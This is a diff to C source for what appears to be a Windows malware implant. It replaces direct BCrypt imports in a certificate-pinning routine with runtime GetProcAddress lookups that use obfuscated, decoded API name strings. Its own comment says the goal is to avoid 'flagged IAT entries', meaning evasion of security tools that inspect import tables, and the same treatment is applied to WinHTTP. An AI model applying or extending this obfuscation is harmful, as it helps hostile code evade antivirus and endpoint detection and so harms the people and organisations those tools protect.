@@ -12,6 +12,35 @@
 #include <string.h>
 #include <stdio.h>
 
+/* BCrypt dynamic dispatch — avoids flagged IAT entries */
+typedef NTSTATUS (WINAPI *_fBcOAP_t)(BCRYPT_ALG_HANDLE*,LPCWSTR,LPCWSTR,ULONG);
+typedef NTSTATUS (WINAPI *_fBcGP_t) (BCRYPT_HANDLE,LPCWSTR,PUCHAR,ULONG,ULONG*,ULONG);
+typedef NTSTATUS (WINAPI *_fBcCAP_t)(BCRYPT_ALG_HANDLE,ULONG);
+typedef NTSTATUS (WINAPI *_fBcCH_t) (BCRYPT_ALG_HANDLE,BCRYPT_HASH_HANDLE*,PUCHAR,ULONG,PUCHAR,ULONG,ULONG);
+typedef NTSTATUS (WINAPI *_fBcHD_t) (BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG);
+typedef NTSTATUS (WINAPI *_fBcFH_t) (BCRYPT_HASH_HANDLE,PUCHAR,ULONG,ULONG);
+typedef NTSTATUS (WINAPI *_fBcDH_t) (BCRYPT_HASH_HANDLE);
+static struct {
+    _fBcOAP_t OAP; _fBcGP_t GP; _fBcCAP_t CAP;
+    _fBcCH_t  CH;  _fBcHD_t HD; _fBcFH_t  FH; _fBcDH_t DH;
+} _bc;
+static void _bc_load(void) {
+    if (_bc.OAP) return;
+    char _sdll[12]; EVS_D(_sdll, EVS_dll_bcrypt);
+    HMODULE h = GetModuleHandleA(_sdll);
+    if (!h) h = LoadLibraryA(_sdll);
+    if (!h) return;
+#define _BG(m,n) _bc.m = (_f##m##_t)(void*)GetProcAddress(h, n)
+    { char _s[32]; EVS_D(_s,EVS_fn_BCryptOpenAlgorithmProvider);  _bc.OAP = (_fBcOAP_t)(void*)GetProcAddress(h,_s); }
+    { char _s[24]; EVS_D(_s,EVS_fn_BCryptGetProperty);             _bc.GP  = (_fBcGP_t) (void*)GetProcAddress(h,_s); }
+    { char _s[32]; EVS_D(_s,EVS_fn_BCryptCloseAlgorithmProvider);  _bc.CAP = (_fBcCAP_t)(void*)GetProcAddress(h,_s); }
+    { char _s[20]; EVS_D(_s,EVS_fn_BCryptCreateHash);              _bc.CH  = (_fBcCH_t) (void*)GetProcAddress(h,_s); }
+    { char _s[20]; EVS_D(_s,EVS_fn_BCryptHashData);                _bc.HD  = (_fBcHD_t) (void*)GetProcAddress(h,_s); }
+    { char _s[20]; EVS_D(_s,EVS_fn_BCryptFinishHash);              _bc.FH  = (_fBcFH_t) (void*)GetProcAddress(h,_s); }
+    { char _s[20]; EVS_D(_s,EVS_fn_BCryptDestroyHash);             _bc.DH  = (_fBcDH_t) (void*)GetProcAddress(h,_s); }
+#undef _BG
+}
+
 /* WinHTTP dynamic dispatch */
 
 typedef BOOL(WINAPI *fn_WH_CrackUrl)(LPCWSTR, DWORD, DWORD, LPURL_COMPONENTS);
@@ -168,29 +197,30 @@ static int _cert_pin_check(HINTERNET hRequest)
         DWORD objSz = 0, cbRes = 0;
         uint8_t *hashObj = NULL;
 
-        if (BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
+        _bc_load();
+        if (!_bc.OAP || _bc.OAP(&hAlg, BCRYPT_SHA256_ALGORITHM, NULL, 0) != 0)
             goto pin_fail;
-        if (BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH,
+        if (!_bc.GP || _bc.GP(hAlg, BCRYPT_OBJECT_LENGTH,
                               (PBYTE)&objSz, sizeof(DWORD), &cbRes, 0) != 0)
             goto pin_fail;
         hashObj = (uint8_t *)malloc(objSz);
         if (!hashObj)
             goto pin_fail;
-        if (BCryptCreateHash(hAlg, &hHash, hashObj, objSz, NULL, 0, 0) != 0)
+        if (!_bc.CH || _bc.CH(hAlg, &hHash, hashObj, objSz, NULL, 0, 0) != 0)
             goto pin_fail;
-        BCryptHashData(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0);
-        BCryptFinishHash(hHash, got, 32, 0);
-        BCryptDestroyHash(hHash);
-        BCryptCloseAlgorithmProvider(hAlg, 0);
+        if (_bc.HD) _bc.HD(hHash, pCert->pbCertEncoded, pCert->cbCertEncoded, 0);
+        if (_bc.FH) _bc.FH(hHash, got, 32, 0);
+        if (_bc.DH) _bc.DH(hHash);
+        if (_bc.CAP) _bc.CAP(hAlg, 0);
         free(hashObj);
         CertFreeCertificateContext(pCert);
         return (memcmp(got, expected, 32) == 0) ? 0 : -1;
 
     pin_fail:
-        if (hHash)
-            BCryptDestroyHash(hHash);
-        if (hAlg)
-            BCryptCloseAlgorithmProvider(hAlg, 0);
+        if (hHash && _bc.DH)
+            _bc.DH(hHash);
+        if (hAlg && _bc.CAP)
+            _bc.CAP(hAlg, 0);
         free(hashObj);
         CertFreeCertificateContext(pCert);
         return -1;
